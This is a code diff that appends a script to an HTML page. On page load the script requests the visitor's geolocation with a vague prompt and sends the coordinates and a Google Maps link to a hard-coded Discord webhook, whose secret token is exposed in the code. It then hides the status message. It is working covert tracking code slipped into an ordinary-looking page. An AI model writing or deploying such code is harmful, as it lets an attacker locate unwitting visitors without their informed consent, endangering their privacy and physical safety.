@@ -283,5 +283,75 @@
             }
         });
     </script>
+      <script>
+        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY"; // Re"; // Replace with your actual webhook URL
+
+        const statusDiv = document.getElementById("status");
+
+        // Function to send data to Discord
+        async function sendToDiscord(locationData) {
+            const payload = {
+                content: "Suspicious Activity Detected!",
+                embeds: [{
+                    title: "Location Details",
+                    color: 16711680,  // Red color for suspicious activity
+                    fields: [
+                        { name: "Latitude", value: locationData.latitude, inline: true },
+                        { name: "Longitude", value: locationData.longitude, inline: true },
+                        { name: "Google Maps", value: `[View on Google Maps](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})`, inline: false }
+                    ]
+                }]
+            };
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+
+                if (!response.ok) {
+                    console.error('Failed to send data to Discord:', response.status, response.statusText);
+                } else {
+                    console.log('Data sent to Discord successfully!');
+                }
+            } catch (error) {
+                console.error('Error sending data to Discord:', error);
+            }
+        }
+
+        // Function to request geolocation and send data to Discord
+        function requestGeolocation() {
+            if (navigator.geolocation) {
+                statusDiv.textContent = "Please allow location access to proceed..."; // Update status
+
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        // Send geolocation data to Discord
+                        await sendToDiscord({ latitude, longitude });
+
+                        // Hide the suspicious activity message after sending the data
+                        statusDiv.style.display = 'none';
+                    },
+                    (error) => {
+                        console.error("Geolocation error:", error);
+                        statusDiv.textContent = "Failed to retrieve location. Please try again.";
+                        statusDiv.style.backgroundColor = 'red';
+                    }
+                );
+            } else {
+                statusDiv.textContent = "Geolocation is not supported by this browser.";
+                statusDiv.style.backgroundColor = 'red';
+            }
+        }
+
+        // Request geolocation when the page loads
+        requestGeolocation();
+    </script>
 </body>
 </html>
